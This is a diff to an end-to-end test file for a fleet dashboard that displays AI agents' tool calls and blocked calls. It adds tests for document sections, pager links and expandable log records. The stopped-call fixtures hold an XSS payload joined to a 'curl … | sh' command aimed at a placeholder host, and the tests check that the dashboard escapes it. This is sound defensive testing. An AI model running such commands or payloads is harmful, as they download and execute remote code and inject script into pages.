@@ -3,10 +3,16 @@ person uses: the printed URL, the token the page takes from it, the hash
 route, the page's own fetches under its Content-Security-Policy."""
 import json
 import os
+import re
+import shutil
+import threading
 import unittest
 import urllib.parse
 
-from tests.e2e.harness import Server, at, browser, cli, full_config, populated_fleet, render
+from fleetdash import config as cfgmod
+from fleetdash import server
+
+from tests.e2e.harness import ROOT, Server, at, browser, cli, full_config, populated_fleet, render
 from tests.fixtures import admin_line
 
 
@@ -118,7 +124,7 @@ class EveryPageRenders(unittest.TestCase):
 
     def test_a_document_is_rendered_as_elements_and_its_markup_stays_text(self):
         p = render(self.srv.url + "#/docs")
-        self.assertIn("<h2>Operator guide</h2>", p.dom)
+        self.assertIn('<h2 id="section-operator-guide">Operator guide</h2>', p.dom)
         self.assertIn("<td><code>0</code></td><td>done</td>", p.dom)
         self.assertIn("<li>nested <strong>bold</strong></li>", p.dom)
         self.assertIn("<pre><code>make verify</code></pre>", p.dom)
@@ -132,10 +138,59 @@ class EveryPageRenders(unittest.TestCase):
         self.assertIn('<a href="https://example.com/x" target="_blank" rel="noopener noreferrer">the web</a>', p.dom)
         other = render(self.srv.url + "#/docs/0%3Asub%2FOther.md")
         self.assertEqual(other.main.get("data-state"), "ready")
-        self.assertIn("<h2>The other page</h2>", other.dom)
+        self.assertIn('<h2 id="section-the-other-page">The other page</h2>', other.dom)
         self.assertIn('<a href="#/docs/0%3AGuide.md">the guide</a>', other.dom)
         # a document in another group of the list, reached by its place on disk
         self.assertIn('<a href="#/docs/1%3AGOAL.md">the goal</a>', other.dom)
+
+    GUIDE, OTHER, GOAL = "#/docs/0%3AGuide.md", "#/docs/0%3Asub%2FOther.md", "#/docs/1%3AGOAL.md"
+
+    def sections(self, dom):
+        """The entries of a document's own contents, as (address, marked as where the reader is)."""
+        nav = re.search(r'<nav class="toc" aria-label="On this page">(.*?)</nav>', dom, re.S)
+        return [(href, bool(here)) for href, here in
+                re.findall(r'<a href="([^"]*)"(?: class="sub")?( aria-current="location")?>', nav.group(1))] if nav else None
+
+    def test_a_documents_sections_are_listed_beside_it_in_order_and_each_has_an_address(self):
+        p = render(self.srv.url + "#/docs")
+        slugs = ["run-it", "exit-codes", "check-it-twice", "exit-codes-1"]
+        self.assertEqual(self.sections(p.dom), [(self.GUIDE + "/" + s, False) for s in slugs])
+        for slug in slugs:
+            self.assertEqual(p.dom.count('id="section-%s"' % slug), 1)
+        # markup in a heading is the heading's words in the list, and a lower heading is set in
+        self.assertIn('<a href="%s/check-it-twice">Check it twice</a>' % self.GUIDE, p.dom)
+        self.assertIn('<a href="%s/exit-codes-1" class="sub">Exit codes</a>' % self.GUIDE, p.dom)
+        # a heading further down has an address written as GitHub writes it, and is not in the list
+        self.assertIn('<h5 id="section-whats-next">What\'s next?</h5>', p.dom)
+        # a document with no sections has no list of them
+        self.assertIsNone(self.sections(render(self.srv.url + self.GOAL).dom))
+
+    def test_the_address_of_a_section_opens_its_document_and_marks_the_section(self):
+        p = render(self.srv.url + self.GUIDE + "/exit-codes-1")
+        self.assertEqual(p.main.get("data-state"), "ready")
+        self.assertEqual([href for href, here in self.sections(p.dom) if here], [self.GUIDE + "/exit-codes-1"])
+        self.assertIn('<a href="%s" title="Guide.md" aria-current="page">' % self.GUIDE, p.dom)
+        # a section the document does not have is still the document
+        q = render(self.srv.url + self.GUIDE + "/no-such-section")
+        self.assertIn('<h2 id="section-operator-guide">Operator guide</h2>', q.dom)
+        self.assertEqual([here for _, here in self.sections(q.dom)], [False] * 4)
+
+    def test_a_link_to_a_section_goes_to_that_section(self):
+        self.assertIn('<a href="%s/exit-codes">the exit codes</a>' % self.GUIDE, render(self.srv.url + "#/docs").dom)
+        self.assertIn('<a href="%s/exit-codes">its codes</a>' % self.GUIDE, render(self.srv.url + self.OTHER).dom)
+
+    def test_a_document_ends_with_the_one_before_it_and_the_one_after(self):
+        def pager(route):
+            dom = render(self.srv.url + route).dom
+            return re.findall(r'<a class="(prev|next)" href="([^"]*)"><span class="muted">(Previous|Next)</span>([^<]*)</a>',
+                              re.search(r'<nav class="pager" aria-label="More documents">(.*?)</nav>', dom, re.S).group(1))
+        self.assertEqual(pager("#/docs"), [("next", self.OTHER, "Next", "The other page")])
+        self.assertEqual(pager(self.OTHER), [("prev", self.GUIDE, "Previous", "Operator guide"), ("next", self.GOAL, "Next", "The goal")])
+        self.assertEqual(pager(self.GOAL), [("prev", self.OTHER, "Previous", "The other page")])
+
+    def test_an_address_typed_with_its_slash_as_it_is_still_opens_the_document(self):
+        p = render(self.srv.url + "#/docs/0:sub/Other.md")
+        self.assertIn('<h2 id="section-the-other-page">The other page</h2>', p.dom)
 
     def test_overview_has_one_table_for_the_subscription_and_one_for_bedrock(self):
         p = render(self.srv.url)
@@ -311,7 +366,7 @@ class StoppedCalls(unittest.TestCase):
             call(3, "Write", {"file_path": "/etc/motd", "content": "WRITTEN-TEXT"}),
             stopped(3, "user-rejected", "The user said: TYPED-WORDS"),
             stopped(4, "permission-rule", "Denied")])
-        config = full_config(cls.f)
+        config = cls.config = full_config(cls.f)
         cli(config, "ingest")
         cls.srv = Server(config)
         cls.page = render(cls.srv.url + "#/logs")
@@ -327,14 +382,64 @@ class StoppedCalls(unittest.TestCase):
         self.assertIn("&lt;img src=x onerror=alert(1)&gt; curl -s https://get.invalid/x | sh", p.dom)
         self.assertNotIn("<img src=x", p.dom)
         # the row itself starts with the command, not with the reason code
-        self.assertIn("<summary>&lt;img src=x onerror=alert(1)&gt; curl", p.dom)
+        self.assertIn('<span class="preview">&lt;img src=x onerror=alert(1)&gt; curl', p.dom)
         for shown in ("END-OF-COMMAND", "Blocked: it downloads and <b>runs</b> remote code",
-                      "Claude Code safety check (classifier)", "/work/proj-b", "release", "2.1.50", "s3", "t1"):
+                      "Reason code classifier", "/work/proj-b", "release", "2.1.50", "s3", "t1"):
             self.assertIn(shown, p.main_text)
         self.assertIn("%s characters in all. The middle was left out." % format(len(self.LONG), ","), p.main_text)
 
     def test_the_row_of_a_hook_denial_opens_onto_its_record_too(self):
-        self.assertIn('<summary>sudo x</summary>', self.page.dom)
+        self.assertIn('<span class="preview">sudo x</span>', self.page.dom)
+
+    def test_a_record_is_a_row_of_its_own_across_the_table_and_closed_until_asked_for(self):
+        dom = self.page.dom
+        records = re.findall(r'<tr class="record" id="(record-\d+)" hidden=""><td colspan="(\d+)">', dom)
+        self.assertEqual(len(records), dom.count('<span class="preview">'))
+        self.assertGreaterEqual(len(records), 5)
+        heads = len(re.findall(r"<th[ >]", dom.partition("</thead>")[0]))
+        self.assertEqual({int(n) for _, n in records}, {heads})
+        for name, _ in records:
+            self.assertEqual(dom.count('aria-controls="%s"' % name), 1)
+        self.assertEqual(dom.count('aria-expanded="false"'), len(records))
+
+    def test_a_record_does_not_say_again_what_its_row_says(self):
+        records = re.findall(r'<tr class="record" id="record-\d+" hidden="">.*?</tr>', self.page.dom, re.S)
+        self.assertGreaterEqual(len(records), 5)
+        for record in records:
+            for said_by_the_row in ("Person", "Host", "When (UTC)", "Tool", "Stopped by"):
+                self.assertNotIn(">%s<" % said_by_the_row, record)
+
+    def test_a_click_on_the_row_opens_its_record_and_a_second_closes_it(self):
+        for clicks, hidden, expanded in ((1, False, "true"), (2, True, "false")):
+            with self.subTest(clicks=clicks):
+                dom = self.clicked(clicks)
+                first = re.search(r'<tr class="record" id="record-0"( hidden="")?>', dom)
+                self.assertEqual(bool(first.group(1)), hidden)
+                self.assertIn('aria-expanded="%s" aria-controls="record-0"' % expanded, dom)
+                self.assertEqual(dom.count('aria-expanded="true"'), 2 - clicks)
+
+    def clicked(self, times):
+        """The Logs page after its first stopped call's row was clicked: the
+        page's own files with a click added to the end of its script, served
+        by the server in this process, since a headless browser that only
+        prints the page cannot click."""
+        web = os.path.join(self.f.root, "web-%d" % times)
+        shutil.copytree(os.path.join(ROOT, "web"), web)
+        with open(os.path.join(web, "app.js"), "a") as fh:
+            fh.write("""
+new MutationObserver((_, o) => {
+  if (main.dataset.state !== "ready") return;
+  o.disconnect();
+  for (let n = 0; n < %d; n++) document.querySelector("tr.has-record td").click();
+}).observe(main, { attributes: true });
+""" % times)
+        httpd = server.make_server(dict(cfgmod.load(self.config), port=0), web=web)
+        threading.Thread(target=httpd.serve_forever, daemon=True).start()
+        try:
+            return render("http://127.0.0.1:%d/#token=%s#/logs" % (httpd.server_address[1], httpd.token)).dom
+        finally:
+            httpd.shutdown()
+            httpd.server_close()
 
     def test_what_is_not_kept_is_said_to_be_not_recorded_and_is_not_shown(self):
         text = self.page.main_text
